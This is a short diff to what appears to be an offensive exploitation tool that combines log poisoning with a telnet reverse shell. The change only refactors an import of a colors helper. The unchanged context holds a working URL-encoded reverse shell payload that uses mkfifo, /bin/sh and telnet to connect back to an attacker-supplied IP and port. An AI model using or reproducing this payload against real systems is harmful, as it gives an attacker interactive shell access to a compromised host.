@@ -5,7 +5,7 @@ from src.utils.encodings import encode
 from src.utils.arguments import init_args
 from src.attacks.logPoison import exploit_log_poison
 from src.utils.info import printInfo
-from src.utils import colors
+from src.utils.colors import Colors
 
 
 def exploit_telnet(exploit, method, ip, port):
@@ -18,7 +18,7 @@ def exploit_telnet(exploit, method, ip, port):
     telnetPayload = f"rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|telnet+{ip}+{port}+>/tmp/f"
 
     print(
-        colors.Colors().purple("[.]")
+        Colors().purple("[.]")
         + " Checking if telnet is available on the target system...", flush = True
     )
 
